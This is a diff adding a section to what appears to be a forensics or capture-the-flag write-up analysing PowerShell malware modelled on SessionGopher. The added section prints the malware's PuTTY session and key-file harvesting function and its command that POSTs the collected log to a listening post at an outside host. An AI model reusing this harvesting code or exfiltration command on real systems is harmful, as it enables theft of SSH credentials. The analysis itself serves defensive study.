@@ -72,5 +72,49 @@ function Invoke-SessionGopher {
 ```
 This function acts as the "main" of the script. It gives away what data the malware is attempting to dig in the declarations of *$PuTTYPathEnding* and *$WinSCPPathEnding*. These tell us that the malware is attempting to look for stored data about the machine's PuTTY and WinSCP sessions. The malware then looks in the Windows User Registry for all past and current users on the machine. After collecting all of the users, the script calls two methods, *ProcessWinSCPLocal* and *ProcessPuTTYLocal*. This confirms that the malware is digging for ssh credentials. We will now look at the *ProcessPuTTYLocal* method.
 
+```
+function ProcessPuTTYLocal($AllPuTTYSessions) {
+
+  # For each PuTTY saved session, extract the information we want
+  foreach($Session in $AllPuTTYSessions) {
+
+    $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname,Keyfile
+
+    $PuTTYSessionObject.Source = $Source
+    $PuTTYSessionObject.Session = (Split-Path $Session -Leaf)
+    $PuTTYSessionObject.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
+    $PuTTYSessionObject.Keyfile = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "PublicKeyFile" -ErrorAction SilentlyContinue).PublicKeyFile)
+
+    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
+    [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)
+
+    # Grab keyfile inode and add it to the array if it's a ppk
+    $Dirs = Get-ChildItem $PuTTYSessionObject.Keyfile -Recurse -ErrorAction SilentlyContinue
+      foreach ($Dir in $Dirs) {
+        Switch ($Dir.Extension) {
+          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
+        }
+      }
+  }
+
+  if ($o) {
+    $ArrayOfPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
+  } else {
+    Write-Log "PuTTY Sessions"
+    Write-Log ($ArrayOfPuTTYSessions | Format-List | Out-String)
+  }
+
+  # Add the array of PuTTY session objects to UserObject
+  $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions
+
+} # ProcessPuTTYLocal
+```
+This is the one of the bulk digging functions of the malware. This method looks at each PuTTY session store in the Registry and extracts two values, *HostName* and *PublicKeyFile*. These two values are exactly what the malware needs to be able to get into a machine, as long as the Public Key file is non-encrypted. From all of the parsed keyfiles in the registry the malware then searches the machine for the matching key files and saves them to the global log as a .csv. The other digging method looks for WinSCP sessions and does the same thing. After the registry and key files are parsed, the malware then makes it POST request to the LP.
+
+```
+Invoke-WebRequest -uri http://rlwmw.invalid:8080 -Method Post -Body $global:log
+```
+Now knowing that the malware is searching for unsecure keys stored on the machine, we must look at the included NTUSER registry file to see if any keys are not encrypted.
+
 ### Understand Windows Registry
 ### Determine Comprimise
